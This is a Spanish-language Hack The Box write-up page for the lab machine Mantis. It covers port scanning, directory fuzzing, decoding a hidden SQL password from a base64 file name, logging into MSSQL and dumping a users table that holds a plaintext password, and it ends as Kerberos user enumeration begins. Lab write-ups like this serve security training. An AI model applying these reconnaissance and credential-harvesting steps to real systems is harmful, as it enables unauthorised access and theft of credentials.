@@ -1,0 +1,948 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Mantis - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Mantis en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Mantis">
+<meta property="og:url" content="http://localhost:4000/htb-mantis/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Mantis en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-mantis/mantis.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-09-19T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-mantis/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Mantis</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Mantis">
+    <meta itemprop="description" content="Resolución de la máquina Mantis en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="September 19, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Mantis
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-09-19T00:00:00-05:00">September 19, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-mantis/banner-mantis.jpg" alt="" /></p>
+
+<h2 id="mantis">Mantis</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.52.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.52
+PING 10.10.10.52 <span class="o">(</span>10.10.10.52<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.52: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>141 ms
+
+<span class="nt">---</span> 10.10.10.52 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 141.180/141.180/141.180/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.52 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-19 19:21 CDT
+Initiating SYN Stealth Scan at 19:21                                                                                             
+Scanning 10.10.10.52 <span class="o">[</span>65535 ports]
+Discovered open port 53/tcp on 10.10.10.52    
+Discovered open port 445/tcp on 10.10.10.52
+Discovered open port 135/tcp on 10.10.10.52                                                                                      
+Discovered open port 139/tcp on 10.10.10.52                                                                                      
+Discovered open port 8080/tcp on 10.10.10.52
+Discovered open port 1433/tcp on 10.10.10.52    
+Discovered open port 38/tcp on 10.10.10.52     
+Discovered open port 49153/tcp on 10.10.10.52   
+Discovered open port 49166/tcp on 10.10.10.52   
+Discovered open port 464/tcp on 10.10.10.52     
+Discovered open port 9389/tcp on 10.10.10.52    
+Discovered open port 3268/tcp on 10.10.10.52    
+Discovered open port 49152/tcp on 10.10.10.52   
+Discovered open port 47001/tcp on 10.10.10.52   
+Discovered open port 49154/tcp on 10.10.10.52   
+Discovered open port 49164/tcp on 10.10.10.52   
+Discovered open port 3269/tcp on 10.10.10.52    
+Discovered open port 50255/tcp on 10.10.10.52   
+Discovered open port 49157/tcp on 10.10.10.52   
+Discovered open port 49168/tcp on 10.10.10.52   
+Discovered open port 1337/tcp on 10.10.10.52    
+Discovered open port 49155/tcp on 10.10.10.52   
+Discovered open port 88/tcp on 10.10.10.52      
+Discovered open port 636/tcp on 10.10.10.52     
+Discovered open port 593/tcp on 10.10.10.52     
+Discovered open port 49158/tcp on 10.10.10.52   
+Discovered open port 5722/tcp on 10.10.10.52    
+Completed SYN Stealth Scan at 19:21, 26.76s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.52                
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>  
+Scanned at 2021-09-19 19:21:03 CDT <span class="k">for </span>27s      
+Not shown: 64173 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 1335 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+1337/tcp  open  waste            syn-ack ttl 127
+1433/tcp  open  ms-sql-s         syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5722/tcp  open  msdfsr           syn-ack ttl 127
+8080/tcp  open  http-proxy       syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49152/tcp open  unknown          syn-ack ttl 127
+49153/tcp open  unknown          syn-ack ttl 127
+49154/tcp open  unknown          syn-ack ttl 127
+49155/tcp open  unknown          syn-ack ttl 127
+49157/tcp open  unknown          syn-ack ttl 127
+49158/tcp open  unknown          syn-ack ttl 127
+49164/tcp open  unknown          syn-ack ttl 127
+49166/tcp open  unknown          syn-ack ttl 127
+49168/tcp open  unknown          syn-ack ttl 127
+50255/tcp open  unknown          syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.02 seconds
+           Raw packets sent: 130159 <span class="o">(</span>5.727MB<span class="o">)</span> | Rcvd: 78237 <span class="o">(</span>3.130MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.52
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 53,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,4
+       │ 9157,49158,49164,49166,49168,50255
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,4
+9164,49166,49168,50255 10.10.10.52 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-19 19:22 CDT
+Nmap scan report <span class="k">for </span>10.10.10.52       
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>  
+                                                                                                                                 
+PORT      STATE SERVICE      VERSION                    
+53/tcp    open  domain       Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15CD4<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
+| dns-nsid:                                                     
+|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15CD4<span class="o">)</span>                                                                              
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-09-20 00:27:33Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                       
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp   open  kpasswd5?                                       
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 
+636/tcp   open  tcpwrapped                                                                                                       
+1337/tcp  open  http         Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5           
+| http-methods:                                                                                                                  
+|_  Potentially risky methods: TRACE                  
+|_http-title: IIS7                                              
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2021-09-20T00:22:20                                                                                          
+|_Not valid after:  2051-09-20T00:22:20    
+|_ssl-date: 2021-09-20T00:28:41+00:00<span class="p">;</span> +4m46s from scanner time. 
+| ms-sql-ntlm-info:                                             
+|   Target_Name: HTB                                            
+|   NetBIOS_Domain_Name: HTB                                    
+|   NetBIOS_Computer_Name: MANTIS                 
+|   DNS_Domain_Name: htb.local                                                                                                   
+|   DNS_Computer_Name: mantis.htb.local           
+|_  Product_Version: 6.1.7601                                   
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped                                      
+5722/tcp  open  msrpc        Microsoft Windows RPC
+8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-open-proxy: Proxy might be redirecting requests                                                                           
+|_http-server-header: Microsoft-IIS/7.5                     
+|_http-title: Tossed Salad - Blog                                                                                                
+9389/tcp  open  mc-nmf       .NET Message Framing               
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0 
+49158/tcp open  msrpc        Microsoft Windows RPC
+49164/tcp open  msrpc        Microsoft Windows RPC
+49166/tcp open  msrpc        Microsoft Windows RPC
+49168/tcp open  msrpc        Microsoft Windows RPC
+50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2021-09-20T00:22:20
+|_Not valid after:  2051-09-20T00:22:20
+|_ssl-date: 2021-09-20T00:28:41+00:00<span class="p">;</span> +4m46s from scanner time. 
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: MANTIS
+|   DNS_Domain_Name: htb.local
+|   DNS_Computer_Name: mantis.htb.local
+|_  Product_Version: 6.1.7601
+Service Info: Host: MANTIS<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 <span class="o">(</span>Windows Server 2008 R2 Standard 6.1<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: mantis
+|   NetBIOS computer name: MANTIS<span class="se">\x</span>00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: mantis.htb.local
+|_  System <span class="nb">time</span>: 2021-09-19T20:28:30-04:00
+|_clock-skew: mean: 39m03s, deviation: 1h30m43s, median: 4m45s
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| ms-sql-info: 
+|   10.10.10.52:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2014 RTM
+|       number: 12.00.2000.00
+|       Product: Microsoft SQL Server 2014
+|       Service pack level: RTM
+|       Post-SP patches applied: <span class="nb">false</span>
+|_    TCP port: 1433
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-09-20T00:28:34
+|_  start_date: 2021-09-20T00:21:54
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>82.40 seconds
+</code></pre></div></div>
+
+<p>Vemos diversos puertos abiertos por los cuales podemos obtener una forma de acceder a la máquina, así que vamos en orden.</p>
+
+<h3 id="smb">SMB</h3>
+<p>Podíamos probar una <em>null session</em> para el servicio smb:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.52 <span class="nt">-N</span>
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+❯ smbmap <span class="nt">-H</span> 10.10.10.52
+<span class="o">[</span>+] IP: 10.10.10.52:445 Name: 10.10.10.52                                       
+❯ smbmap <span class="nt">-H</span> 10.10.10.52 <span class="nt">-u</span> <span class="s2">"null"</span>
+<span class="o">[!]</span> Authentication error on 10.10.10.52
+</code></pre></div></div>
+
+<p>Podemos acceder al servicio SMB con una <em>null session</em>; sin embargo, no se lista algún recurso, por lo que igual podriamos esperar para obtener credenciales válidas de acceso y tratar de listar los recursos del servicio.</p>
+
+<h3 id="web">Web</h3>
+
+<p>Vamos a tratar de ver el contenido de los sitios web alojados en la máquina, que de acuerdo con el archivo <strong>targeted</strong> vemos el puerto 1337 asociado a <em>Microsoft IIS 7.5</em>. Aquí podriamos pensar que ejecutando el exploit de <em>MS17-010</em> podemos acceder al equipo; sin embargo, al parecer se encuentra parcheado.  También vemos el puerto 8080 relacionado con el blog <em>Tossed Salad - Blog</em>:</p>
+
+<p><img src="/assets/images/htb-mantis/mantis_web.png" alt="" /></p>
+
+<p>Con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> podemos obtener un poco de información adicional; como el uso del CMS Orchard, que de acuerdo con lo investigado, poco podemos hacer.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.52:8080/
+http://10.10.10.52:8080/ <span class="o">[</span>200 OK] ASP_NET[4.0.30319][MVC5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.52], MetaGenerator[Orchard], Microsoft-IIS[7.5], Script[text/javascript], Title[Tossed Salad - Blog], UncommonHeaders[x-generator,x-aspnetmvc-version], X-Powered-By[ASP.NET]
+</code></pre></div></div>
+
+<p>Podemos tratar se hacer un <em>fuzzing</em> empezando el puerto 1337, pero antes creamos un direccionario a partir del <code class="language-plaintext highlighter-rouge">directory-list-2.3-medium.txt</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-E</span> <span class="s2">"user|pass|cred|note|secur"</span> <span class="o">&gt;</span> dictionary.txt
+❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> dictionary.txt http://10.10.10.52:1337/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.52:1337/FUZZ
+Total requests: 1637
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================
+
+000000802:   301        1 L      10 W       160 Ch      "secure_notes"                                                  
+
+Total time: 0
+Processed Requests: 1637
+Filtered Requests: 1636
+Requests/sec.: 0
+</span></code></pre></div></div>
+
+<p>Tenemos el recurso <em>secure_notes</em> que al acceder vemos dos archivos. El primero, un archivo txt que tiene un nombre un poco extraño después del <em>dev_notes_</em> y de acuerdo con el formato, podría trate de  una cadena en base64.</p>
+
+<p><img src="/assets/images/htb-mantis/mantis_fuzz.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
+</span>6d2424716c5f53405f504073735730726421
+</code></pre></div></div>
+
+<p>El resultado nos va una cadena en hexadecimal, por lo que la pasamos a un formato legible para nosotros:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx"</span> | <span class="nb">base64</span> <span class="nt">-d</span>| xxd <span class="nt">-ps</span> <span class="nt">-r</span><span class="p">;</span> <span class="nb">echo
+</span>m<span class="nv">$$</span>ql_S@_P@ssW0rd!
+</code></pre></div></div>
+
+<p>Vemos una posible contraseña asociada al servicio de SQL (no olvidemos guardar siempre las posibles credenciales que identifiquemos). Ahora, checando el contenido del archivo txt, tenemos lo siguiente:</p>
+
+<p><img src="/assets/images/htb-mantis/mantis_sql.png" alt="" /></p>
+
+<p>Tenemos varias pistas:</p>
+<ul>
+  <li>CMS Orchard</li>
+  <li>Usuario del SQL server <strong>admin</strong></li>
+  <li>Base de datos <strong>orcharddb</strong></li>
+</ul>
+
+<p>Ya tenemos credenciales potenciales a probar en el servicio de SQL.</p>
+
+<h3 id="microsoft-sql-server">Microsoft SQL Server</h3>
+
+<p>A través del puerto 1433 vemos que corre el servicio <em>Microsoft SQL Server</em>. Podriamos intentar acceder a dicho recurso como el usuario <strong>sa</strong> (usuario común):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ sqsh <span class="nt">-U</span> <span class="s1">'sa'</span> <span class="nt">-S</span> 10.10.10.52
+sqsh-2.5.16.1 Copyright <span class="o">(</span>C<span class="o">)</span> 1995-2001 Scott C. Gray
+Portions Copyright <span class="o">(</span>C<span class="o">)</span> 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information <span class="nb">type</span> <span class="s1">'\warranty'</span>
+Password: 
+Login failed <span class="k">for </span>user <span class="s1">'sa'</span><span class="nb">.</span>
+Password: 
+Login failed <span class="k">for </span>user <span class="s1">'sa'</span><span class="nb">.</span>
+Password: 
+Login failed <span class="k">for </span>user <span class="s1">'sa'</span><span class="nb">.</span>
+Password: ^C
+</code></pre></div></div>
+
+<p>No nos permite acceder al servidor como el usuario <strong>sa</strong> y sin contraseña o probando contraseñas default. Recordando que tenemos potenciales credenciales, las probamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ sqsh <span class="nt">-U</span> <span class="s1">'admin'</span> <span class="nt">-S</span> 10.10.10.52
+sqsh-2.5.16.1 Copyright <span class="o">(</span>C<span class="o">)</span> 1995-2001 Scott C. Gray
+Portions Copyright <span class="o">(</span>C<span class="o">)</span> 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information <span class="nb">type</span> <span class="s1">'\warranty'</span>
+Password: 
+1&gt; 
+</code></pre></div></div>
+
+<p>Estamos dentro del SQL Server. Primeramente, vamos a listar las tablas alojadas en la base de datos que identificamos <em>orcharddb</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; SELECT TABLE_NAME from orcharddb.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE <span class="o">=</span> <span class="s1">'BASE TABLE'</span><span class="p">;</span>
+2&gt; go <span class="nt">-m</span> csv <span class="o">&gt;</span> output.csv
+1&gt;
+</code></pre></div></div>
+
+<p>Con el comando <code class="language-plaintext highlighter-rouge">go -m csv &gt; output.csv</code> nos exportamos la información a nuestro directorio de trabajo, esto es para tener la información de una forma más cómoda ya que el sin esto, la manera en como presenta el servidor la información es muy fea. En dicho archivo, vemos dos tablas que tienen la palabra <strong>user</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>output.csv | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s2">"user"</span>
+<span class="s2">"blog_Orchard_Users_UserPartRecord"</span>
+<span class="s2">"blog_Orchard_Roles_UserRolesPartRecord"</span>
+</code></pre></div></div>
+
+<p>A este punto, vamos a listar el contenido de la tabla <code class="language-plaintext highlighter-rouge">blog_Orchard_Users_UserPartRecord</code>. (Nota: Para visualizar la información en un formato decente, vamos a exportar la información en formato html y la veremos en nuestro navegador en la dirección <em>localhost</em>):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; USE orcharddb<span class="p">;</span>
+2&gt; SELECT <span class="k">*</span> FROM blog_Orchard_Users_UserPartRecord<span class="p">;</span>
+3&gt; go <span class="nt">-m</span> html <span class="o">&gt;</span> index.html
+1&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp </span>index.html /var/www/html/.
+❯ service apache2 start
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-mantis/mantis_db.png" alt="" /></p>
+
+<p>Como se puede observar en los resultados obtenidos, tenemos el usuario <strong>admin</strong> y el usuario <strong>james</strong>, quien tiene una contraseña en texto claro; asi que nos guardamos las credenciales.</p>
+
+<h3 id="kerberos">Kerberos</h3>
+
+<p>Se tiene el puerto 88 abierto asociado al servicio de kerberos, por lo que podríamos conectarnos a través de una <em>null session</em> y ver posibles usuarios del dominio.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.52
+Enter WORKGROUP<span class="se">\'</span>s password: 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<p>Tampoco podemos ver la información relacionada al dominio.</p>
+
+<h3 id="fuerza-bruta-forma-de-obtener-usuarios-del-dominio">Fuerza bruta (forma de obtener usuarios del dominio)</h3>
+
+<p>A este punto vemos que no tenemos forma de hacerlo; pero NO, vamos a tratar de acceder un tipo de ataque de fuerza bruta para obtener usuarios del dominio, para ello necesitamos de <a href="https://github.com/danielmiessler/SecLists">SecList</a>; lo descargamos en nuestra máquina y haciendo uso del script <code class="language-plaintext highlighter-rouge">krb5-user-enum</code> en <code class="language-plaintext highlighter-rouge">nmap</code> y del archivo <code class="language-plaintext highlighter-rouge">names.txt</code> de <em>SecList</em>, procedemos a ejecutar el siguiente comando:</p>
+
